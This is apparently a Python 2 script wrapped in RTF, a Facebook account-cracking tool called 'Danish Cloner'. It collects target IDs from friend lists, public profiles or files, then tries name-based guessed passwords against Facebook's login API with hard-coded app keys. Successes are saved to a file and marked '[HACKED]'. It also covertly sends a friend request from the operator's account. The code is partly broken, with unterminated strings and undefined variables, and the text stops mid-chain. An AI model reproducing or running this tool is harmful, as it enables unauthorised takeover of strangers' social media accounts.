{\rtf1\ansi\deff0\nouicompat{\fonttbl{\f0\fnil\fcharset0 Courier New;}{\f1\fnil\fcharset1 Segoe UI Symbol;}{\f2\fnil\fcharset1 Segoe UI Symbol;}{\f3\fnil\fcharset1 Cambria Math;}{\f4\fnil\fcharset128 MS Mincho;}{\f5\fnil Courier New;}{\f6\fnil Segoe UI Symbol;}{\f7\fnil\fcharset1 Cambria Math;}}
{\*\generator Riched20 10.0.18362}{\*\mmathPr\mmathFont3\mwrapIndent1440 }\viewkind4\uc1 
\pard\f0\fs22\lang1033 #!/usr/bin/python2\par
#coding=utf-8\par
\par
\par
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize\par
from multiprocessing.pool import ThreadPool\par
from requests.exceptions import ConnectionError\par
from mechanize import Browser\par
\par
\par
reload(sys)\par
sys.setdefaultencoding('utf8')\par
br = mechanize.Browser()\par
br.set_handle_robots(False)\par
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)\par
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]\par
\par
\par
def keluar():\par
\tab print "\\033[1;96m[!] \\x1b[1;91mExit"\par
\tab os.sys.exit()\par
\par
\par
def acak(b):\par
    w = 'ahtdzjc'\par
    d = ''\par
    for i in x:\par
        d += '!'+w[random.randint(0,len(w)-1)]+i\par
    return cetak(d)\par
\par
\par
def cetak(b):\par
    w = 'ahtdzjc'\par
    for i in w:\par
        j = w.index(i)\par
        x= x.replace('!%s'%i,'\\033[%s;1m'%str(31+j))\par
    x += '\\033[0m'\par
    x = x.replace('!0','\\033[0m')\par
    sys.stdout.write(x+'\\n')\par
\par
\par
def jalan(z):\par
\tab for e in z + '\\n':\par
\tab\tab sys.stdout.write(e)\par
\tab\tab sys.stdout.flush()\par
\tab\tab time.sleep(00000.1)\par
\par
\par
#### LOGO ####\par
logo = """\par
\\033[1;93m\f1\u-10179?\u-8923?\f2\u9581?\u9580?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9580?\u9582?\f1\u-10179?\u-8923?\f0\par
\\033[0;94m  \f2\u9889?\f0  \f2\u10031?\f0  \f3\u-10187?\u-8850?\u-10187?\u-8809?\u-10187?\u-8822?\u-10187?\u-8826?\u-10187?\u-8807?\u-10187?\u-8812?\u-10187?\u-8809?\f0  \f2\u10026?\f0  \lang1033 Danish \f2\u10028?\u9889?\f0\par
\\033[0;94m  \f2\par
\f0\\033[0;97m  \f2\u9889?\f0  \f2\u10031?\f0  \f3\u-10187?\u-8844?\u-10187?\u-8814?\f0  \f3\u-10187?\u-8813?\f0\'f8\f3\u-10187?\u-8807?\f0  \f3\u-10187?\u-8809?\u-10187?\u-8822?\u-10187?\u-8808?\u-10187?\u-8811?\u-10187?\u-8812?\u-10187?\u-8813?\u-10187?\u-8808?\u-10187?\u-8818?\u-10187?\u-8825?\u-10187?\u-8815?\u-10187?\u-8822?\f0  \f3\u-10187?\u-8821?\u-10187?\u-8812?\u-10187?\u-8809?\f0  \f3\u-10187?\u-8826?\u-10187?\u-8813?\u-10187?\u-8802?\f0  \f3\u-10187?\u-8814?\u-10187?\u-8818?\u-10187?\u-8808?\u-10187?\u-8808?\f0  \f3\u-10187?\u-8806?\u-10187?\u-8808?\u-10187?\u-8822?\f0  \f2\u10028?\u9889?\f0\par
\\034[0;92m  \f2\u9889?\f0    \f4\'83\'63\f0\par
\\033[1;93m\f1\u-10179?\u-8923?\f2\u9584?\u9580?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9580?\u9583?\f1\u-10179?\u-8923?\f0  """\par
                                                \par
def tik():\par
\tab titik = ['.   ','..  ','... ']\par
\tab for o in titik:\par
\tab\tab print("\\r\\x1b[1;93mPlease Wait \\x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)\par
\par
\par
back = 0\par
berhasil = []\par
cekpoint = []\par
oks = []\par
id = []\par
listgrup = []\par
vulnot = "\\033[31mNot Vuln"\par
vuln = "\\033[32mVuln"\par
\par
os.system("clear")\par
print  """\par
jalan("\\033[1;96m\f5\bullet\f2\u9672?\f6\bullet\f2\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\f6\bullet\f2\u9672?\f6\bullet\f0\\033[1;99mDanish\\033[1;99m\f5\bullet\f2\u9672?\f6\bullet\f2\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\f6\bullet\f2\u9672?\f6\bullet\f0 ")                        \par
jalan("\\033[1;96m  ___ _    __   __  _  ___  ___ ")  \par
jalan("\\033[1;96m / _/| |  /__\\ |  \\| || __|| _ \\ CLONE ALL COUNTRY")\par
jalan("\\033[1;96m| \\__| |_| \\/ || | ' || _| | v / ") \par
jalan("\\033[1;96m \\__/|___|\\__/ |_|\\__||___||_|_\\ ") \par
jalan("\\033[1;97m INDIAN USER USE ANY PROXY TO CLONE")\par
jalan("\\033[1;97m WIFI USER USE ANY PROXY TO CLONE")\par
jalan("\\033[1;93m Welcome to Danish Cloner")\par
jalan("\\033[1;96m\f5\bullet\f2\u9672?\f6\bullet\f2\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\f6\bullet\f2\u9672?\f6\bullet\f0\\033[1;96mDanish CLoner\\033[1;96m\f5\bullet\f2\u9672?\f6\bullet\f2\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\u9472?\f6\bullet\f2\u9672?\f6\bullet\f0 ")\par
\par
CorrectUsername = "danish"\par
CorrectPassword = "danish"\par
\par
loop = 'true'\par
while (loop == 'true'):\par
    username = raw_input("\\033[1;97m\f1\u-10179?\u-9013?\f0  \\x1b[1;95mENTER USER\\x1b[1;97m\'bb\'bb \\x1b[1;97m")\par
    if (username == CorrectUsername):\par
    \tab password = raw_input("\\033[1;97m\f1\u-10179?\u-8739?\f0  \\x1b[1;95mENTER PASSWORD\\x1b[1;97m\'bb\'bb \\x1b[1;97m")\par
        if (password == CorrectPassword):\par
            print "Logged in successfully as " + username #Dev:Cloner\par
\tab     time.sleep(2)\par
            loop = 'false'\par
        else:\par
            print "\\033[1;96mWrong Password"\par
            os.system('xdg-open \par
    else:\par
        print "\\033[1;96mWrong Username"\par
        os.system('xdg-open \par
\par
def login():\par
\tab os.system('clear')\par
\tab try:\par
\tab\tab toket = open('login.txt','r')\par
\tab\tab menu() \par
\tab except (KeyError,IOError):\par
\tab\tab os.system('clear')\par
\tab\tab print logo\par
\tab\tab print 42*"\\033[1;96m="\par
\tab\tab print('\\033[1;96m[\f2\u9889?\f0 ] \\x1b[1;93mLogin your new id \\x1b[1;93m[\f2\u9889?\f0 ]' )\par
\tab\tab id = raw_input('\\033[1;963m[+] \\x1b[0;34mEnter ID/Email \\x1b[1;93m: \\x1b[1;93m')\par
\tab\tab pwd = raw_input('\\033[1;93m[+] \\x1b[0;34mEnter Password \\x1b[1;93m: \\x1b[1;93m')\par
\tab\tab tik()\par
\tab\tab try:\par
\tab\tab\tab br.open('https://m.facebook.com')\par
\tab\tab except mechanize.URLError:\par
\tab\tab\tab print"\\n\\033[1;96m[!] \\x1b[1;91mTidak ada koneksi"\par
\tab\tab\tab keluar()\par
\tab\tab br._factory.is_html = True\par
\tab\tab br.select_form(nr=0)\par
\tab\tab br.form['email'] = id\par
\tab\tab br.form['pass'] = pwd\par
\tab\tab br.submit()\par
\tab\tab url = br.geturl()\par
\tab\tab if 'save-device' in url:\par
\tab\tab\tab try:\par
\tab\tab\tab\tab sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'\par
\tab\tab\tab\tab data = \{"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"\}\par
\tab\tab\tab\tab x=hashlib.new("md5")\par
\tab\tab\tab\tab x.update(sig)\par
\tab\tab\tab\tab a=x.hexdigest()\par
\tab\tab\tab\tab data.update(\{'sig':a\})\par
\tab\tab\tab\tab url = "https://api.facebook.com/restserver.php"\par
\tab\tab\tab\tab r=requests.get(url,params=data)\par
\tab\tab\tab\tab z=json.loads(r.text)\par
\tab\tab\tab\tab unikers = open("login.txt", 'w')\par
\tab\tab\tab\tab unikers.write(z['access_token'])\par
\tab\tab\tab\tab unikers.close()\par
\tab\tab\tab\tab print '\\n\\033[1;96m[\f2\u10003?\f0 ] \\x1b[1;92mLogin Hogai'\par
\tab\tab\tab\tab os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')\par
\tab\tab\tab\tab requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])\par
\tab\tab\tab\tab menu()\par
\tab\tab\tab except requests.exceptions.ConnectionError:\par
\tab\tab\tab\tab print"\\n\\033[1;96m[!] \\x1b[1;91mTidak ada koneksi"\par
\tab\tab\tab\tab keluar()\par
\tab\tab if 'checkpoint' in url:\par
\tab\tab\tab print("\\n\\033[1;96m[!] \\x1b[1;91mAisa lagta hai apka account checkpoint pe hai")\par
\tab\tab\tab os.system('rm -rf login.txt')\par
\tab\tab\tab time.sleep(1)\par
\tab\tab\tab keluar()\par
\tab\tab else:\par
\tab\tab\tab print("\\n\\033[1;96m[!] \\x1b[1;91mPassword/Email ghalat hai")\par
\tab\tab\tab os.system('rm -rf login.txt')\par
\tab\tab\tab time.sleep(1)\par
\tab\tab\tab login()\par
\par
\par
def menu():\par
\tab os.system('clear')\par
\tab try:\par
\tab\tab toket=open('login.txt','r').read()\par
\tab except IOError:\par
\tab\tab os.system('clear')\par
\tab\tab print"\\x1b[1;91m[!] Token invalid"\par
\tab\tab os.system('rm -rf login.txt')\par
\tab\tab time.sleep(1)\par
\tab\tab login()\par
\tab try:\par
\tab\tab otw = requests.get('https://graph.facebook.com/me?access_token='+toket)\par
\tab\tab a = json.loads(otw.text)\par
\tab\tab nama = a['name']\par
\tab\tab id = a['id']\par
\tab\tab ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)\par
\tab\tab b = json.loads(ots.text)\par
\tab\tab sub = str(b['summary']['total_count'])\par
\tab except KeyError:\par
\tab\tab os.system('clear')\par
\tab\tab print"\\033[1;91mYour Account is on Checkpoint"\par
\tab\tab os.system('rm -rf login.txt')\par
\tab\tab time.sleep(1)\par
\tab\tab login()\par
\tab except requests.exceptions.ConnectionError:\par
\tab\tab print"\\x1b[1;92mThere is no internet connection"\par
\tab\tab keluar()\par
\tab os.system("clear")\par
\tab print logo\par
\tab print "   \\033[1;36;40m      \f2\u9556?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9559?\f0 "\par
\tab print "   \\033[1;36;40m      \f2\u9553?\f0\\033[1;32;40m[*] Name\\033[1;32;40m: "+nama+"  \tab    \\033[1;36;40m\f2\u9553?\f0 "                               \par
\tab print "   \\033[1;36;40m      \f2\u9553?\f0\\033[1;33;40m[*] ID  \\033[1;34;40m: "+id+"        \\033[1;36;40m\f2\u9553?\f0 "\par
\tab print "   \\033[1;36;40m      \f2\u9553?\f0\\033[1;36;40m[*] Subs\\033[1;34;40m: "+sub+"                      \\033[1;36;40m\f2\u9553?\f0 "\par
\tab print "   \\033[1;36;40m      \f2\u9562?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9565?\f0 "\par
\tab print "\\033[1;32;40m[1] \\033[1;33;41mHack The World"\tab\par
\tab print "\\033[1;32;40m[2] \\033[1;33;42mUpdate Danish cloner"\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\par
\tab print "\\033[1;32;40m[0] \\033[1;33;43mLog out"\par
\tab pilih()\par
\tab\par
def pilih():\par
\tab unikers = raw_input("\\n\\033[1;31;40m>>> \\033[1;35;40m")\par
\tab if unikers =="":\par
\tab\tab print "\\x1b[1;91mFill in correctly"\par
\tab\tab pilih()\par
\tab elif unikers =="1":\par
\tab\tab super()\par
\tab elif unikers =="2":\par
\tab\tab os.system('clear')\par
\tab\tab print logo\par
\tab\tab print " \\033[1;36;40m\f2\u9679?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\f7\u9668?\f2\u9658?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9552?\u9679?\f0\\n"\par
\tab\tab os.system('git pull origin master')\par
\tab\tab raw_input('\\n\\x1b[1;91m[ \\x1b[1;97mBack \\x1b[1;91m]')\par
\tab\tab menu()\par
\tab elif unikers =="0":\par
\tab\tab jalan('Token Removed')\par
\tab\tab os.system('rm -rf login.txt')\par
\tab\tab keluar()\par
\tab else:\par
\tab\tab print "\\x1b[1;91mFill in correctly"\par
\tab\tab pilih()\par
\par
def super():\par
\tab global toket\par
\tab os.system('clear')\par
\tab try:\par
\tab\tab toket=open('login.txt','r').read()\par
\tab except IOError:\par
\tab\tab print"\\x1b[1;91mToken invalid"\par
\tab\tab os.system('rm -rf login.txt')\par
\tab\tab time.sleep(1)\par
\tab\tab login()\par
\tab os.system('clear')\par
\tab print logo\par
\tab print "\\x1b[1;32;40m[type1] \\033[1;33;41mHack From Friend List"\par
\tab print "\\x1b[1;32;40m[type2] \\033[1;33;42mHack From Public ID Danish bhai yehi use krna"\par
\tab print "\\x1b[1;32;40m[type3] \\033[1;33;43mHack Bruteforce"\par
\tab print "\\x1b[1;32;40m[type4] \\033[1;33;44mHack From File"\par
\tab print "\\x1b[1;32;40m[type0] \\033[1;33;45mBack"\par
\tab pilih_super()\par
\par
def pilih_super():\par
\tab peak = raw_input("\\n\\033[1;31;40m>>> \\033[1;97m")\par
\tab if peak =="":\par
\tab\tab print "\\x1b[1;91mFill in correctly"\par
\tab\tab pilih_super()\par
\tab elif peak =="1":\par
\tab\tab os.system('clear')\par
\tab\tab print logo\par
\par
\tab\tab jalan('\\033[1;93m[\f2\u10042?\f0 ] Getting IDs \\033[1;97m...')\par
\tab\tab r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)\par
\tab\tab z = json.loads(r.text)\par
\tab\tab for s in z['data']:\par
\tab\tab\tab id.append(s['id'])\par
\par
\tab elif peak =="2":\par
\tab\tab os.system('clear')\par
\tab\tab print logo\par
\tab\tab idt = raw_input("\\033[1;96m[*] Enter ID : ")\par
\tab\tab try:\par
\tab\tab\tab jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)\par
\tab\tab\tab op = json.loads(jok.text)\par
\tab\tab\tab print"\\033[1;31;40m[\f2\u10042?\f0 ] Name : "+op["name"]\par
\tab\tab except KeyError:\par
\tab\tab\tab print"\\x1b[1;92m[\f2\u10042?\f0 ] ID Not Found!"\par
\tab\tab\tab raw_input("\\n\\033[1;96m[\\033[1;94mBack\\033[1;96m]")\par
\tab\tab\tab super()\par
\tab\tab print"\\033[1;35;40m[\f2\u10042?\f0 ] Getting IDs...(Sabar kro)"\par
\tab\tab r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)\par
\tab\tab z = json.loads(r.text)\par
\tab\tab for i in z['data']:\par
\tab\tab\tab id.append(i['id'])\par
\tab elif peak =="3":\par
\tab\tab os.system('clear')\par
\tab\tab print logo\par
\tab\tab brute()\tab\par
\tab elif peak =="4":\par
\tab\tab os.system('clear')\par
\tab\tab print logo                  \par
\tab\tab try:\par
\tab\tab\tab idlist = raw_input('\\x1b[1;91m[+] \\x1b[1;93mEnter File Path  \\x1b[1;91m: \\x1b[1;93m')\par
\tab\tab\tab for line in open(idlist,'r').readlines():\par
\tab\tab\tab\tab id.append(line.strip())\par
\tab\tab except IOError:\par
\tab\tab\tab print '\\x1b[1;96m[!] \\x1b[1;91mFile Not Found'\par
\tab\tab\tab raw_input('\\n\\x1b[1;96m[ \\x1b[1;97mBack \\x1b[1;91m]')\par
\tab\tab\tab super()\par
\tab elif peak =="0":\par
\tab\tab menu()\par
\tab else:\par
\tab\tab print "\\033[1;96m[!] \\x1b[1;91mFill in correctly"\par
\tab\tab pilih_super()\par
\tab\par
\tab print "\\033[1;96m[+] \\033[1;93mTotal IDs \\033[1;91m: \\033[1;97m"+str(len(id))\par
\tab jalan('\\033[1;96m[\f2\u10042?\f0 ] \\033[1;93mStarting \\033[1;97m...')\par
\tab titik = ['.   ','..  ','... ']\par
\tab for o in titik:\par
\tab\tab print("\\r\\033[1;96m[\\033[1;97m\f2\u10040?\f0\\033[1;96m] \\033[1;93mCracking \\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)\par
\tab print\par
\tab print('\\x1b[1;96m[!] \\x1b[1;93mTo Stop Process Press CTRL Then Press z')\par
\tab print 42*"\\033[1;96m="\par
\tab\par
\tab\tab\tab\par
\tab def main(arg):\par
\tab\tab global cekpoint,oks\par
\tab\tab user = arg\par
\tab\tab try:\par
\tab\tab\tab os.mkdir('out')\par
\tab\tab except OSError:\par
\tab\tab\tab pass\par
\tab\tab try:\par
\tab\tab\tab a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)\par
\tab\tab\tab b = json.loads(a.text)\par
\tab\tab\tab pass1 = b['first_name'] + '786'\par
\tab\tab\tab data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")\par
\tab\tab\tab q = json.load(data)\par
\tab\tab\tab if 'access_token' in q:\par
\tab\tab\tab\tab print '\\x1b[1;92m[OK] \\x1b[1;92m ' + user  + ' \\x1b[1;92m | \\x1b[1;92m ' + pass1 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab oks.append(user+pass1)\par
\tab\tab\tab else:\par
\tab\tab\tab\tab if 'www.facebook.com' in q["error_msg"]:\par
\tab\tab\tab\tab\tab print '\\x1b[1;36;40m[HACKED] \\x1b[1;97m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;97m ' + pass1 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab cek = open("out/CP.txt", "a")\par
\tab\tab\tab\tab\tab cek.write(user+"|"+pass1+"\\n")\par
\tab\tab\tab\tab\tab cek.close()\par
\tab\tab\tab\tab\tab cekpoint.append(user+pass1)\par
\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab pass2 = b['first_name'] + '123'\par
\tab\tab\tab\tab\tab data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")\par
\tab\tab\tab\tab\tab q = json.load(data)\par
\tab\tab\tab\tab\tab if 'access_token' in q:\par
\tab\tab\tab\tab\tab\tab print '\\x1b[1;92m[OK] \\x1b[1;92m ' + user  + ' \\x1b[1;92m | \\x1b[1;92m ' + pass2 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab oks.append(user+pass2)\par
\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab if 'www.facebook.com' in q["error_msg"]:\par
\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;36;40m[HACKED] \\x1b[1;97m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;97m ' + pass2 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab cek = open("out/CP.txt", "a")\par
\tab\tab\tab\tab\tab\tab\tab cek.write(user+"|"+pass2+"\\n")\par
\tab\tab\tab\tab\tab\tab\tab cek.close()\par
\tab\tab\tab\tab\tab\tab\tab cekpoint.append(user+pass2)\par
\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab pass3 = b['first_name'] + '12345'\par
\tab\tab\tab\tab\tab\tab\tab data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")\par
\tab\tab\tab\tab\tab\tab\tab q = json.load(data)\par
\tab\tab\tab\tab\tab\tab\tab if 'access_token' in q:\par
\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;92m[OK] \\x1b[1;92m ' + user  + ' \\x1b[1;92m | \\x1b[1;92m ' + pass3 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab oks.append(user+pass3)\par
\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab if 'www.facebook.com' in q["error_msg"]:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;36;40m[HACKED] \\x1b[1;97m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;97m ' + pass3 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab cek = open("out/CP.txt", "a")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.write(user+"|"+pass3+"\\n")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.close()\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab cekpoint.append(user+pass4)\par
\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab pass4 = b['first_name'] + '1234'\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab q = json.load(data)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'access_token' in q:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;92m[OK] \\x1b[1;92m ' + user  + ' \\x1b[1;92m | \\x1b[1;92m ' + pass4 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab oks.append(user+pass4)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'www.facebook.com' in q["error_msg"]:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;36;40m[HACKED] \\x1b[1;97m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;97m ' + pass4 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek = open("out/CP.txt", "a")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.write(user+"|"+pass4+"\\n")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.close()\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cekpoint.append(user+pass4)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab pass5 = '786786'\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab q = json.load(data)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'access_token' in q:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;92m[OK] \\x1b[1;92m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;92m ' + pass5 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab oks.append(user+pass5)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'www.facebook.com' in q["error_msg"]:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;36;40m[HACKED] \\x1b[1;97m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;97m ' + pass5 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek = open("out/CP.txt", "a")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.write(user+"|"+pass5+"\\n")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.close()\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cekpoint.append(user+pass5)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab pass6 = b['last_name'] + '123'\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab q = json.load(data)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'access_token' in q:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;92m[OK] \\x1b[1;92m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;92m ' + pass6 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab oks.append(user+pass6)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab if 'www.facebook.com' in q["error_msg"]:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab print '\\x1b[1;36;40m[HACKED] \\x1b[1;97m ' + user  + ' \\x1b[1;36;40m|\\x1b[1;97m ' + pass6 + ' \f2\u9889?\f0  ' + b['name']\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek = open("out/CP.txt", "a")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.write(user+"|"+pass6+"\\n")\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cek.close()\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab cekpoint.append(user+pass6)\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab else:\par
\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab\tab pass7 = 'Pakistan'\par
